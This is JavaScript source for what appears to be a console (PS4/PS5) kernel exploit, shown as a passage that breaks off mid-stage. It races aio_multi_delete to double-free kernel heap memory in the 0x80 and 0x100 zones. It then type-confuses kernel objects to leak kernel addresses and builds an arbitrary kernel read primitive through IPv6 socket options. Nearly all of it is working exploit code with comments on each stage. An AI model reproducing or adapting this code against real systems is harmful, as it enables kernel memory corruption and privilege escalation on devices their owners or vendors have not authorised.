// #define SCE_KERNEL_AIO_PRIORITY_HIGH    3
// int aio_submit_cmd(
//     u_int cmd,
//     SceKernelAioRWRequest reqs[],
//     u_int num_reqs,
//     u_int prio,
//     SceKernelAioSubmitId ids[]
// );
function aio_submit_cmd(cmd, requests, num_requests, handles) {
  sysi('aio_submit_cmd', cmd, requests, num_requests, 3, handles);
}
// int aio_multi_delete(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int sce_errors[]
// );
function aio_multi_delete(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_delete', ids, num_ids, sce_errs);
}
// int aio_multi_poll(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_poll(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_poll', ids, num_ids, sce_errs);
}
// int aio_multi_cancel(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[]
// );
function aio_multi_cancel(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_cancel', ids, num_ids, sce_errs);
}
// // wait for all (AND) or atleast one (OR) to finish
// // DEFAULT is the same as AND
// #define SCE_KERNEL_AIO_WAIT_DEFAULT 0x00
// #define SCE_KERNEL_AIO_WAIT_AND     0x01
// #define SCE_KERNEL_AIO_WAIT_OR      0x02
//
// int aio_multi_wait(
//     SceKernelAioSubmitId ids[],
//     u_int num_ids,
//     int states[],
//     //SCE_KERNEL_AIO_WAIT_*
//     uint32_t mode,
//     useconds_t *timeout
// );
function aio_multi_wait(ids, num_ids, sce_errs) {
  if (sce_errs === undefined) {
    sce_errs = get_aio_errors_p();
  }
  sysi('aio_multi_wait', ids, num_ids, sce_errs, 1, 0);
}

function make_reqs1(num_reqs) {
  const reqs1 = new Buffer(0x28 * num_reqs);
  for (var i = 0; i < num_reqs; i++) {
    // .fd = -1
    reqs1.write32(0x20 + i * 0x28, -1);
  }
  return reqs1;
}

function spray_aio(loops=1, reqs1_p, num_reqs, ids_p, multi=true, cmd=AIO_CMD_READ) {
  const step = 4 * (multi ? num_reqs : 1);
  cmd |= multi ? AIO_CMD_FLAG_MULTI : 0;
  for (var i = 0, idx = 0; i < loops; i++) {
    aio_submit_cmd(cmd, reqs1_p, num_reqs, ids_p.add(idx));
    idx += step;
  }
}

function poll_aio(ids, states, num_ids=ids.length) {
  if (states !== undefined) {
    states = states.addr;
  }
  aio_multi_poll(ids.addr, num_ids, states);
}

function cancel_aios(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (var bi = 0; bi < num_batches; bi++) {
    aio_multi_cancel(ids_p.add((bi << 2) * len), len);
  }
  if (rem) {
    aio_multi_cancel(ids_p.add((num_batches << 2) * len), rem);
  }
}

function free_aios(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (var bi = 0; bi < num_batches; bi++) {
    const addr = ids_p.add((bi << 2) * len);
    aio_multi_cancel(addr, len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
  if (rem) {
    const addr = ids_p.add((num_batches << 2) * len);
    aio_multi_cancel(addr, len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
}

function free_aios2(ids_p, num_ids) {
  const len = max_aio_ids;
  const rem = num_ids % len;
  const num_batches = (num_ids - rem) / len;
  for (var bi = 0; bi < num_batches; bi++) {
    const addr = ids_p.add((bi << 2) * len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
  if (rem) {
    const addr = ids_p.add((num_batches << 2) * len);
    aio_multi_poll(addr, len);
    aio_multi_delete(addr, len);
  }
}

function get_cpu_affinity(mask) {
  sysi(
    'cpuset_getaffinity',
    CPU_LEVEL_WHICH,
    CPU_WHICH_TID,
    -1,
    sizeof_cpuset_t_,
    mask.addr
  );
}

function set_cpu_affinity(mask) {
  sysi(
    'cpuset_setaffinity',
    CPU_LEVEL_WHICH,
    CPU_WHICH_TID,
    -1,
    sizeof_cpuset_t_,
    mask.addr
  );
}

function pin_to_core(core) {
  const mask = new Buffer(sizeof_cpuset_t_);
  mask.write32(0, 1 << core);
  set_cpu_affinity(mask);
}

function get_core_index(mask) {
  var num = mem.read32(mask.addr);
  var position = 0;
  while (num > 0) {
    num = num >>> 1;
    position += 1;
  }
  return position - 1;
}

function get_current_core() {
  const mask = new Buffer(sizeof_cpuset_t_);
  get_cpu_affinity(mask);
  return get_core_index(mask);
}

function get_current_rtprio() {
  const _rtprio = new Buffer(4);
  sysi('rtprio_thread', RTP_LOOKUP, 0, _rtprio.addr);
  return {
    type: _rtprio.read16(0),
    prio: _rtprio.read16(2),
  };
}

function set_rtprio(rtprio_obj) {
  const _rtprio = new Buffer(4);
  _rtprio.write16(0, rtprio_obj.type);
  _rtprio.write16(2, rtprio_obj.prio);
  sysi('rtprio_thread', RTP_SET, 0, _rtprio.addr);
}

function close(fd) {
  sysi('close', fd);
}

function new_socket() {
  return sysi('socket', AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
}

function new_tcp_socket() {
  return sysi('socket', AF_INET, SOCK_STREAM, 0);
}

function gsockopt(sd, level, optname, optval, optlen) {
  const size = new Word(optval.size);
  if (optlen !== undefined) {
    size[0] = optlen;
  }
  sysi('getsockopt', sd, level, optname, optval.addr, size.addr);
  return size[0];
}

function setsockopt(sd, level, optname, optval, optlen) {
  sysi('setsockopt', sd, level, optname, optval, optlen);
}

function ssockopt(sd, level, optname, optval, optlen) {
  if (optlen === undefined) {
    optlen = optval.size;
  }

  const addr = optval.addr;
  setsockopt(sd, level, optname, addr, optlen);
}

function get_rthdr(sd, buf, len) {
  return gsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function set_rthdr(sd, buf, len) {
  ssockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

function free_rthdrs(sds) {
  for (const sd of sds) {
    setsockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
  }
}

function build_rthdr(buf, size) {
  const len = ((size >> 3) - 1) & ~1;
  size = (len + 1) << 3;
  buf[0] = 0;
  buf[1] = len;
  buf[2] = 0;
  buf[3] = len >> 1;
  return size;
}

function spawn_thread(thread) {
  const off_context_size = 0xc8;
  const ctx = new Buffer(off_context_size);
  const pthread = new Pointer();
  pthread.ctx = ctx;
  // pivot the pthread's stack pointer to our stack
  ctx.write64(0x38, thread.stack_addr);
  ctx.write64(0x80, thread.get_gadget('ret'));
  call_nze(
    'pthread_create',
    pthread.addr,
    0,
    chain.get_gadget('setcontext'),
    ctx.addr
  );
  return pthread;
}
//================================================================================================
// FUNCTIONS FOR STAGE: 0x80 MALLOC ZONE DOUBLE FREE =============================================
//================================================================================================
function make_aliased_rthdrs(sds) {
  const marker_offset = 4;
  const size = 0x80;
  const buf = new Buffer(size);
  const rsize = build_rthdr(buf, size);
  for (var loop = 0; loop < num_alias; loop++) {
    for (var i = 0; i < num_sds; i++) {
      buf.write32(marker_offset, i);
      set_rthdr(sds[i], buf, rsize);
    }
    for (var i = 0; i < sds.length; i++) {
      get_rthdr(sds[i], buf);
      const marker = buf.read32(marker_offset);
      if (marker !== i) {
        //log(`aliased rthdrs at attempt: ${loop}`);
        const pair = [sds[i], sds[marker]];
        //log(`found pair: ${pair}`);
        sds.splice(marker, 1);
        sds.splice(i, 1);
        free_rthdrs(sds);
        sds.push(new_socket(), new_socket());
        return pair;
      }
    }
  }
  die(`failed to make aliased rthdrs. size: ${hex(size)}`);
}
// summary of the bug at aio_multi_delete():
//void free_queue_entry(struct aio_entry *reqs2) {
//  if (reqs2->ar2_spinfo != NULL) {
//    printf(
//      "[0]%s() line=%d Warning !! split info is here\n",
//      __func__,
//      __LINE__
//    );
//  }
//  if (reqs2->ar2_file != NULL) {
//    // we can potentially delay .fo_close()
//    fdrop(reqs2->ar2_file, curthread);
//    reqs2->ar2_file = NULL;
//  }
//  free(reqs2, M_AIO_REQS2);
//}
//int _aio_multi_delete(
//  struct thread *td,
//  SceKernelAioSubmitId ids[],
//  u_int num_ids,
//  int sce_errors[]) {
//  // ...
//  struct aio_object *obj = id_rlock(id_tbl, id, 0x160, id_entry);
//  // ...
//  u_int rem_ids = obj->ao_rem_ids;
//  if (rem_ids != 1) {
//    // BUG: wlock not acquired on this path
//    obj->ao_rem_ids = --rem_ids;
//    // ...
//    free_queue_entry(obj->ao_entries[req_idx]);
//    // the race can crash because of a NULL dereference since this path
//    // doesn't check if the array slot is NULL so we delay
//    // free_queue_entry()
//    obj->ao_entries[req_idx] = NULL;
//  } else {
//    // ...
//  }
//  // ...
//}
function race_one(request_addr, tcp_sd, barrier, racer, sds) {
  const sce_errs = new View4([-1, -1]);
  const thr_mask = new Word(1 << main_core);
  const thr = racer;
  thr.push_syscall(
    'cpuset_setaffinity',
    CPU_LEVEL_WHICH,
    CPU_WHICH_TID,
    -1,
    8,
    thr_mask.addr
  );
  thr.push_syscall('rtprio_thread', RTP_SET, 0, get_rtprio().addr);
  thr.push_gadget('pop rax; ret');
  thr.push_value(1);
  thr.push_get_retval();
  thr.push_call('pthread_barrier_wait', barrier.addr);
  thr.push_syscall(
    'aio_multi_delete',
    request_addr,
    1,
    sce_errs.addr_at(1)
  );
  thr.push_call('pthread_exit', 0);
  const pthr = spawn_thread(thr);
  const thr_tid = pthr.read32(0);
  // pthread barrier implementation:
  // given a barrier that needs N threads for it to be unlocked, a thread
  // will sleep if it waits on the barrier and N - 1 threads havent't arrived
  // before
  // if there were already N - 1 threads then that thread (last waiter) won't
  // sleep and it will send out a wake-up call to the waiting threads
  // since the ps4's cores only have 1 hardware thread each, we can pin 2
  // threads on the same core and control the interleaving of their
  // executions via controlled context switches
  // wait for the worker to enter the barrier and sleep
  while (thr.retval_int === 0) {
    sys_void('sched_yield');
  }
  // enter the barrier as the last waiter
  chain.push_call('pthread_barrier_wait', barrier.addr);
  // yield and hope the scheduler runs the worker next. the worker will then
  // sleep at soclose() and hopefully we run next
  chain.push_syscall('sched_yield');
  // if we get here and the worker hasn't been reran then we can delay the
  // worker's execution of soclose() indefinitely
  chain.push_syscall('thr_suspend_ucontext', thr_tid);
  chain.push_get_retval();
  chain.push_get_errno();
  chain.push_end();
  chain.run();
  chain.reset();
  const main_res = chain.retval_int;
  //log(`suspend ${thr_tid}: ${main_res} errno: ${chain.errno}`);
  if (main_res === -1) {
    call_nze('pthread_join', pthr, 0);
    //log();
    return null;
  }
  var won_race = false;
  try {
    const poll_err = new View4(1);
    aio_multi_poll(request_addr, 1, poll_err.addr);
    //log(`poll: ${hex(poll_err[0])}`);
    const info_buf = new View1(size_tcp_info);
    const info_size = gsockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf);
    //log(`info size: ${hex(info_size)}`);
    if (info_size !== size_tcp_info) {
      die(`info size isn't ${size_tcp_info}: ${info_size}`);
    }
    const tcp_state = info_buf[0];
    //log(`tcp_state: ${tcp_state}`);
    const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    if (poll_err[0] !== SCE_KERNEL_ERROR_ESRCH
      && tcp_state !== TCPS_ESTABLISHED
    ) {
      // PANIC: double free on the 0x80 malloc zone. important kernel
      // data may alias
      aio_multi_delete(request_addr, 1, sce_errs.addr);
      won_race = true;
    }
  } finally {
    //log('resume thread\n');
    sysi('thr_resume_ucontext', thr_tid);
    call_nze('pthread_join', pthr, 0);
  }
  if (won_race) {
    //log(`race errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
    // if the code has no bugs then this isn't possible but we keep the
    // check for easier debugging
    if (sce_errs[0] !== sce_errs[1]) {
      //log('ERROR: bad won_race');
      die('ERROR: bad won_race');
    }
    // RESTORE: double freed memory has been reclaimed with harmless data
    // PANIC: 0x80 malloc zone pointers aliased
    return make_aliased_rthdrs(sds);
  }
  return null;
}
//================================================================================================
// STAGE DOUBLE FREE AIO QUEUE ENTRY =============================================================
//================================================================================================
function double_free_reqs2(sds) {
  function swap_bytes(x, byte_length) {
    var res = 0;
    for (var i = 0; i < byte_length; i++) {
      res |= ((x >> (8 * i)) & 0xff) << (8 * (byte_length - i - 1));
    }
    return res >>> 0;
  }
  function htons(x) {
    return swap_bytes(x, 2);
  }
  function htonl(x) {
    return swap_bytes(x, 4);
  }
  const server_addr = new Buffer(16);
  // sockaddr_in.sin_family
  server_addr[1] = AF_INET;
  // sockaddr_in.sin_port
  server_addr.write16(2, htons(5050));
  // sockaddr_in.sin_addr = 127.0.0.1
  server_addr.write32(4, htonl(0x7f000001));
  const racer = new Chain();
  const barrier = new Long();
  call_nze('pthread_barrier_init', barrier.addr, 0, 2);
  const num_reqs = 3;
  const which_req = num_reqs - 1;
  const reqs1 = make_reqs1(num_reqs);
  const reqs1_p = reqs1.addr;
  const aio_ids = new View4(num_reqs);
  const aio_ids_p = aio_ids.addr;
  const req_addr = aio_ids.addr_at(which_req);
  const cmd = AIO_CMD_FLAG_MULTI | AIO_CMD_READ;
  const sd_listen = new_tcp_socket();
  ssockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, new Word(1));
  sysi('bind', sd_listen, server_addr.addr, server_addr.size);
  sysi('listen', sd_listen, 1);
  for (var i = 0; i < num_races; i++) {
    const sd_client = new_tcp_socket();
    sysi('connect', sd_client, server_addr.addr, server_addr.size);
    const sd_conn = sysi('accept', sd_listen, 0, 0);
    // force soclose() to sleep
    ssockopt(sd_client, SOL_SOCKET, SO_LINGER, View4.of(1, 1));
    reqs1.write32(0x20 + which_req * 0x28, sd_client);
    aio_submit_cmd(cmd, reqs1_p, num_reqs, aio_ids_p);
    aio_multi_cancel(aio_ids_p, num_reqs);
    aio_multi_poll(aio_ids_p, num_reqs);
    // drop the reference so that aio_multi_delete() will trigger _fdrop()
    close(sd_client);
    const res = race_one(req_addr, sd_conn, barrier, racer, sds);
    racer.reset();
    // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got decremented
    // twice. this will leave one request undeleted
    aio_multi_delete(aio_ids_p, num_reqs);
    close(sd_conn);
    if (res !== null) {
      window.log(` - Won race at attempt: ${i}`);
      close(sd_listen);
      call_nze('pthread_barrier_destroy', barrier.addr);
      return res;
    }
  }
  die('failed aio double free');
}
//================================================================================================
// FUNCTIONS FOR STAGE: LEAK 0x100 MALLOC ZONE ADDRESS ===========================================
//================================================================================================
function new_evf(flags) {
  const name = cstr('');
  // int evf_create(char *name, uint32_t attributes, uint64_t flags)
  return sysi('evf_create', name.addr, 0, flags);
}

function set_evf_flags(id, flags) {
  sysi('evf_clear', id, 0);
  sysi('evf_set', id, flags);
}

function free_evf(id) {
  sysi('evf_delete', id);
}

function verify_reqs2(buf, offset) {
  // reqs2.ar2_cmd
  if (buf.read32(offset) !== AIO_CMD_WRITE) {
    return false;
  }
  // heap addresses are prefixed with 0xffff_xxxx
  // xxxx is randomized on boot
  // heap_prefixes is a array of randomized prefix bits from a group of heap
  // address candidates. if the candidates truly are from the heap, they must
  // share a common prefix
  const heap_prefixes = [];
  // check if offsets 0x10 to 0x20 look like a kernel heap address
  for (var i = 0x10; i <= 0x20; i += 8) {
    if (buf.read16(offset + i + 6) !== 0xffff) {
      return false;
    }
    heap_prefixes.push(buf.read16(offset + i + 4));
  }
  // check reqs2.ar2_result.state
  // state is actually a 32-bit value but the allocated memory was
  // initialized with zeros. all padding bytes must be 0 then
  const state = buf.read32(offset + 0x38);
  if (!(0 < state && state <= 4) || buf.read32(offset + 0x38 + 4) !== 0) {
    return false;
  }
  // reqs2.ar2_file must be NULL since we passed a bad file descriptor to
  // aio_submit_cmd()
  if (!buf.read64(offset + 0x40).eq(0)) {
    return false;
  }
  // check if offsets 0x48 to 0x50 look like a kernel address
  for (var i = 0x48; i <= 0x50; i += 8) {
    if (buf.read16(offset + i + 6) === 0xffff) {
      // don't push kernel ELF addresses
      if (buf.read16(offset + i + 4) !== 0xffff) {
        heap_prefixes.push(buf.read16(offset + i + 4));
      }
      // offset 0x48 can be NULL
    } else if (i === 0x50 || !buf.read64(offset + i).eq(0)) {
      return false;
    }
  }
  return heap_prefixes.every((e, i, a) => e === a[0]);
}
//================================================================================================
// STAGE LEAK KERNEL ADDRESSES ===================================================================
//================================================================================================
function leak_kernel_addrs(sd_pair) {
  close(sd_pair[1]);
  const sd = sd_pair[0];
  const buf = new Buffer(0x80 * leak_len);
  // type confuse a struct evf with a struct ip6_rthdr. the flags of the evf
  // must be set to >= 0xf00 in order to fully leak the contents of the rthdr
  //log('confuse evf with rthdr');
  var evf = null;
  for (var i = 0; i < num_alias; i++) {
    const evfs = [];
    for (var j = 0; j < num_handles; j++) {
      evfs.push(new_evf(0xf00 | (j << 16)));
    }
    get_rthdr(sd, buf, 0x80);
    // for simplicity, we'll assume i < 2**16
    const flags32 = buf.read32(0);
    evf = evfs[flags32 >>> 16];
    set_evf_flags(evf, flags32 | 1);
    get_rthdr(sd, buf, 0x80);
    // double check with Al-Azif
    if (buf.read32(0) === (flags32 | 1)) {
      evfs.splice(flags32 >> 16, 1);
    } else {
      evf = null;
    }
    for (const evf of evfs) {
      free_evf(evf);
    }
    if (evf !== null) {
      //log(`confused rthdr and evf at attempt: ${i}`);
      break;
    }
  }
  if (evf === null) {
    die('failed to confuse evf and rthdr');
  }
  set_evf_flags(evf, 0xff << 8);
  get_rthdr(sd, buf, 0x80);
  // fields we use from evf (number before the field is the offset in hex):
  // struct evf:
  //     0 u64 flags
  //     28 struct cv cv
  //     38 TAILQ_HEAD(struct evf_waiter) waiters
  // evf.cv.cv_description = "evf cv"
  // string is located at the kernel's mapped ELF file
  const kernel_addr = buf.read64(0x28);
  //log(`"evf cv" string addr: ${kernel_addr}`);
  // because of TAILQ_INIT(), we have:
  // evf.waiters.tqh_last == &evf.waiters.tqh_first
  // we now know the address of the kernel buffer we are leaking
  const kbuf_addr = buf.read64(0x40).sub(0x38);
  //log(`kernel buffer addr: ${kbuf_addr}`);
  // 0x80 < num_elems * sizeof(SceKernelAioRWRequest) <= 0x100
  // allocate reqs1 arrays at 0x100 malloc zone
  const num_elems = 6;
  // use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
  // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
  // field
  const ucred = kbuf_addr.add(4);
  const leak_reqs = make_reqs1(num_elems);
  const leak_reqs_p = leak_reqs.addr;
  leak_reqs.write64(0x10, ucred);
  const leak_ids_len = num_handles * num_elems;
  const leak_ids = new View4(leak_ids_len);
  const leak_ids_p = leak_ids.addr;
  const num_leaks_kernel = 30;
  //log('find aio_entry');
  var reqs2_off = null;
  var found = 0;
  var found_off = 0;
  for (var i = 0; (i < num_leaks_kernel) && !found; i++) {
    get_rthdr(sd, buf);
    spray_aio(
      num_handles,
      leak_reqs_p,
      num_elems,
      leak_ids_p,
      true,
      AIO_CMD_WRITE
    );
    get_rthdr(sd, buf);
    for (var off = 0x80; off < buf.length; off += 0x40) {
      if (verify_reqs2(buf, off)) {
        found_off = off;
        found = true;
        window.log(` - Found reqs2 at attempt: ${i}`);
        break;
      }
    }
    if (!found) {
      free_aios(leak_ids_p, leak_ids_len);
    }
  }
  if (found) {
    reqs2_off = found_off;
  }
  if (reqs2_off === null) {
    die('could not leak a reqs2');
  }
  //log(`reqs2 offset: ${hex(reqs2_off)}`);
  get_rthdr(sd, buf);
  const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
  //log('leaked aio_entry:');
  //hexdump(reqs2);
  const reqs1_addr = new Long(reqs2.read64(0x10));
  //log(`reqs1_addr: ${reqs1_addr}`);
  reqs1_addr.lo &= -0x100;
  //log(`reqs1_addr: ${reqs1_addr}`);
  //log('searching target_id');
  var target_id = null;
  var to_cancel_p = null;
  var to_cancel_len = null;
  for (var i = 0; i < leak_ids_len; i += num_elems) {
    aio_multi_cancel(leak_ids_p.add(i << 2), num_elems);
    get_rthdr(sd, buf);
    const state = buf.read32(reqs2_off + 0x38);
    if (state === AIO_STATE_ABORTED) {
      window.log(` - Found target_id at batch: ${i / num_elems}`);
      target_id = new Word(leak_ids[i]);
      leak_ids[i] = 0;
      //log(`target_id: ${hex(target_id)}`);
      const reqs2 = buf.slice(reqs2_off, reqs2_off + 0x80);
      //log('leaked aio_entry:');
      //hexdump(reqs2);
      const start = i + num_elems;
      to_cancel_p = leak_ids.addr_at(start);
      to_cancel_len = leak_ids_len - start;
      break;
    }
  }
  if (target_id === null) {
    die('target_id not found');
  }
  cancel_aios(to_cancel_p, to_cancel_len);
  free_aios2(leak_ids_p, leak_ids_len);
  return [reqs1_addr, kbuf_addr, kernel_addr, target_id, evf];
}
//================================================================================================
// FUNCTIONS FOR STAGE: 0x100 MALLOC ZONE DOUBLE FREE ============================================
//================================================================================================
function make_aliased_pktopts(sds) {
  const tclass = new Word();
  const pktopts_loopcnt = 1;
  for (var loop = 0; loop < pktopts_loopcnt; loop++) {
    for (var i = 0; i < num_sds; i++) {
      setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }
    for (var i = 0; i < num_sds; i++) {
      tclass[0] = i;
      ssockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
    }
    for (var i = 0; i < sds.length; i++) {
      gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
      const marker = tclass[0];
      if (marker !== i) {
        window.log(` - Aliased pktopts at attempt: ${loop}`);
        const pair = [sds[i], sds[marker]];
        //log(`found pair: ${pair}`);
        sds.splice(marker, 1);
        sds.splice(i, 1);
        // add pktopts to the new sockets now while new allocs can't
        // use the double freed memory
        for (var j = 0; j < 2; j++) {
          const sd = new_socket();
          ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
          sds.push(sd);
        }
        return pair;
      }
    }
  }
  die('failed to make aliased pktopts');
}
//================================================================================================
// STAGE DOUBLE FREE SceKernelAioRWRequest =======================================================
//================================================================================================
function double_free_reqs1(
  reqs1_addr, kbuf_addr, target_id, evf, sd, sds
) {
  const max_leak_len = (0xff + 1) << 3;
  const buf = new Buffer(max_leak_len);
  const num_elems = max_aio_ids;
  const aio_reqs = make_reqs1(num_elems);
  const aio_reqs_p = aio_reqs.addr;
  const num_batches = 2;
  const aio_ids_len = num_batches * num_elems;
  const aio_ids = new View4(aio_ids_len);
  const aio_ids_p = aio_ids.addr;
  //log('start overwrite rthdr with AIO queue entry loop');
  var aio_not_found = true;
  free_evf(evf);
  for (var i = 0; i < num_clobbers; i++) {
    spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);
    if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
      //log(`aliased at attempt: ${i}`);
      aio_not_found = false;
      cancel_aios(aio_ids_p, aio_ids_len);
      break;
    }
    free_aios(aio_ids_p, aio_ids_len);
  }
  if (aio_not_found) {
    die('failed to overwrite rthdr');
  }
  const reqs2 = new Buffer(0x80);
  const rsize = build_rthdr(reqs2, reqs2.size);
  // .ar2_ticket
  reqs2.write32(4, 5);
  // .ar2_info
  reqs2.write64(0x18, reqs1_addr);
  // craft a aio_batch using the end portion of the buffer
  const reqs3_off = 0x28;
  // .ar2_batch
  reqs2.write64(0x20, kbuf_addr.add(reqs3_off));
  // [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
  // safe since free_queue_entry() doesn't deref the pointer
  reqs2.write32(reqs3_off, 1);
  reqs2.write32(reqs3_off + 4, 0);
  // [.ar3_state, .ar3_done] aliases .ar2_result.returnValue
  reqs2.write32(reqs3_off + 8, AIO_STATE_COMPLETE);
  reqs2[reqs3_off + 0xc] = 0;
  // .ar3_lock aliases .ar2_qentry (rest of the buffer is padding)
  // safe since the entry already got dequeued
  // .ar3_lock.lock_object.lo_flags = (
  //     LO_SLEEPABLE | LO_UPGRADABLE
  //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
  //     | 6 << LO_CLASSSHIFT
  //     | LO_INITIALIZED
  // )
  reqs2.write32(reqs3_off + 0x28, 0x67b0000);
  // .ar3_lock.lk_lock = LK_UNLOCKED
  reqs2.write64(reqs3_off + 0x38, 1);
  const states = new View4(num_elems);
  const states_p = states.addr;
  const addr_cache = [aio_ids_p];
  for (var i = 1; i < num_batches; i++) {
    addr_cache.push(aio_ids_p.add((i * num_elems) << 2));
  }
  //log('start overwrite AIO queue entry with rthdr loop');
  var req_id = null;
  close(sd);
  sd = null;
  loop: for (var i = 0; i < num_alias; i++) {
    for (const sd of sds) {
      set_rthdr(sd, reqs2, rsize);
    }
    for (var batch = 0; batch < addr_cache.length; batch++) {
      states.fill(-1);
      aio_multi_cancel(addr_cache[batch], num_elems, states_p);
      const req_idx = states.indexOf(AIO_STATE_COMPLETE);
      if (req_idx !== -1) {
        //log(`req_idx: ${req_idx}`);
        //log(`found req_id at batch: ${batch}`);
        //log(`states: ${[...states].map(e => hex(e))}`);
        //log(`states[${req_idx}]: ${hex(states[req_idx])}`);
        //log(`aliased at attempt: ${i}`);
        const aio_idx = batch * num_elems + req_idx;
        req_id = new Word(aio_ids[aio_idx]);
        //log(`req_id: ${hex(req_id)}`);
        aio_ids[aio_idx] = 0;
        // set .ar3_done to 1
        poll_aio(req_id, states);
        //log(`states[${req_idx}]: ${hex(states[0])}`);
        for (var j = 0; j < num_sds; j++) {
          const sd2 = sds[j];
          get_rthdr(sd2, reqs2);
          const done = reqs2[reqs3_off + 0xc];
          if (done) {
            //hexdump(reqs2);
            sd = sd2;
            sds.splice(j, 1);
            free_rthdrs(sds);
            sds.push(new_socket());
            break;
          }
        }
        if (sd === null) {
          die("can't find sd that overwrote AIO queue entry");
        }
        //log(`sd: ${sd}`);
        break loop;
      }
    }
  }
  if (req_id === null) {
    die('failed to overwrite AIO queue entry');
  }
  free_aios2(aio_ids_p, aio_ids_len);
  // enable deletion of target_id
  poll_aio(target_id, states);
  //log(`target's state: ${hex(states[0])}`);
  const sce_errs = new View4([-1, -1]);
  const target_ids = new View4([req_id, target_id]);
  // PANIC: double free on the 0x100 malloc zone. important kernel data may
  // alias
  aio_multi_delete(target_ids.addr, 2, sce_errs.addr);
  // we reclaim first since the sanity checking here is longer which makes it
  // more likely that we have another process claim the memory
  try {
    // RESTORE: double freed memory has been reclaimed with harmless data
    // PANIC: 0x100 malloc zone pointers aliased
    const sd_pair = make_aliased_pktopts(sds);
    return [sd_pair, sd];
  } finally {
    //log(`delete errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
    states[0] = -1;
    states[1] = -1;
    poll_aio(target_ids, states);
    //log(`target states: ${hex(states[0])}, ${hex(states[1])}`);
    const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    var success = true;
    if (states[0] !== SCE_KERNEL_ERROR_ESRCH) {
      //log('ERROR: bad delete of corrupt AIO request');
      success = false;
    }
    if (sce_errs[0] !== 0 || sce_errs[0] !== sce_errs[1]) {
      //log('ERROR: bad delete of ID pair');
      success = false;
    }
    if (!success) {
      die('ERROR: double free on a 0x100 malloc zone failed');
    }
  }
}
//================================================================================================
// STAGE GET ARBITRARY KERNEL READ/WRITE =========================================================
//================================================================================================
// k100_addr is double freed 0x100 malloc zone address
// dirty_sd is the socket whose rthdr pointer is corrupt
// kernel_addr is the address of the "evf cv" string
function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
  const psd = pktopts_sds[0];
  const tclass = new Word();
  const off_tclass = is_ps4 ? 0xb0 : 0xc0;
  const pktopts = new Buffer(0x100);
  const rsize = build_rthdr(pktopts, pktopts.size);
  const pktinfo_p = k100_addr.add(0x10);
  // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
  pktopts.write64(0x10, pktinfo_p);
  //log('overwrite main pktopts');
  var reclaim_sd = null;
  close(pktopts_sds[1]);
  for (var i = 0; i < num_alias; i++) {
    for (var j = 0; j < num_sds; j++) {
      // if a socket doesn't have a pktopts, setting the rthdr will make
      // one. the new pktopts might reuse the memory instead of the
      // rthdr. make sure the sockets already have a pktopts before
      pktopts.write32(off_tclass, 0x4141 | (j << 16));
      set_rthdr(sds[j], pktopts, rsize);
    }
    gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
    const marker = tclass[0];
    if ((marker & 0xffff) === 0x4141) {
      window.log(` - Found reclaim sd at attempt: ${i}`);
      const idx = marker >>> 16;
      reclaim_sd = sds[idx];
      sds.splice(idx, 1);
      break;
    }
  }
  if (reclaim_sd === null) {
    die('failed to overwrite main pktopts');
  }
  const pktinfo = new Buffer(0x14);
  pktinfo.write64(0, pktinfo_p);
  const nhop = new Word();
  const nhop_p = nhop.addr;
  const read_buf = new Buffer(8);
  const read_buf_p = read_buf.addr;
  function kread64(addr) {
    const len = 8;
    var offset = 0;
    while (offset < len) {
      // pktopts.ip6po_pktinfo = addr + offset
      pktinfo.write64(8, addr.add(offset));
      nhop[0] = len - offset;
      ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
      sysi(
        'getsockopt',
        psd, IPPROTO_IPV6, IPV6_NEXTHOP,
        read_buf_p.add(offset), nhop_p
      );
      const n = nhop[0];
      if (n === 0) {
        read_buf[offset] = 0;
        offset += 1;
      } else {
        offset += n;
      }
    }
    return read_buf.read64(0);
  }
  const ka = kread64(kernel_addr);
  //log(`kread64(&"evf cv"): ${kread64(kernel_addr)}`);
  const kstr = jstr(read_buf);
  //log(`*(&"evf cv"): ${kstr}`);
  if (kstr !== 'evf cv') {
    die('test read of &"evf cv" failed');
  }
  const kbase = kernel_addr.sub(off_kstr);
